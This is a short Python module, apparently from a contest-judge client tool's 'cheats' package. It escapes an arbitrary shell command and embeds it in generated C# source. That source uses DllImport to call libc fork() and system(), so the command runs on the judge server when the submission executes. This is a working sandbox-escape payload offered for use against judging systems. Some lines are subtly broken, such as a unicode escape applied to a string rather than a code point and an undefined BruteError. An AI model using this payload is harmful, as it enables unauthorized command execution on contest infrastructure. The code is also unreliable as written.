import brutejudge.cheats

def check_exists(file):
    return True

def read_file(cmd):
    fmt = ''
    for i in cmd:
        if ord(i) in range(32, 127) and i != '\\' and i != '"' or i.isalnum():
            fmt += i
        elif i == '\\':
            fmt += '\\\\'
        elif i == '"':
            fmt += '\\"'
        elif i == '\n':
            fmt += '\\n'
        elif ord(i) < 65536:
            fmt += '\\u%04x'%i
        else:
            raise BruteError("format_cscmd: unicode character %X (%c) is not supported"%(ord(i), i))
    return """\
using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
namespace HelloWorld
{
    class Hello 
    {
        [DllImport("libc.so.6")]
        private static extern int fork();
        [DllImport("libc.so.6")]
        private static extern int system(string cmd);
        static void Main() 
        {
            if(fork() != 0)return;
            system("%s");
        }
    }
}
"""%fmt
